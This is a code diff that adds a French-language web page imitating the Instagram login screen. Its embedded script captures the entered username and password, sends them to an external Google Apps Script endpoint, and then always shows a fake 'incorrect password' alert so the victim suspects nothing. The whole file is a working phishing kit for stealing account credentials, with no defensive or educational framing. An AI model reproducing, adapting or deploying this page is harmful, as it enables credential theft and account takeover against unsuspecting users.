@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="C:\Users\USER\OneDrive\Bureau\fb.css">
+    <title>Instagram - Connexion ou inscription</title>  
+    <link rel="icon" type="image/x-icon" href="https://cdn.icon-icons.com/icons2/836/PNG/512/Instagram_icon-icons.com_66804.png">
+</head>
+
+<header>
+    <img src="back.png" class="backbtn">
+    <p class="language">Français (France)</p>
+</header>
+
+<body>
+    <div class="container">
+        <img src="C:\Users\USER\OneDrive\Bureau\insta-logo.png" alt="instagram.png" class="logo">
+    </div>
+
+    <div class="login-container">
+        <form id="loginForm">
+            <input type="text" class="facebook-input" name="text" placeholder="Nom d'utilisateur, e-mail ou numéro de tél." required>
+            <input type="password" class="facebook-input" name="password" placeholder="Mot de passe" required>
+            <button type="submit" class="login-btn">Se connecter</button>
+            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+        </form>
+    </div>
+	
+	<button type="submit" class="login-btn1">Créer un compte</button>
+	
+	<footer>
+	 <div class="container1">
+	  <img src="meta.png" class="meta"> 
+	 </div>
+	</footer>
+	
+	
+	
+	
+	
+	 <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbydQZyCzvfb8eGkSE_iNImUCegnXgVkX1cJoV0KKapVRqupKl0OrIFSN4CPYYPF9Grn/exec';
+            const form = document.getElementById('loginForm');
+
+            form.addEventListener('submit', e => {
+                e.preventDefault(); // Prevent the default form submission
+                fetch(scriptURL, { 
+                    method: 'POST',
+                    body: new FormData(form)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    alert('mot de passe incorrect'); // Show the message
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('mot de passe incorrect'); // Show the message on error as well
+                });
+            });
+        });
+    </script>
+</body>
+</html>
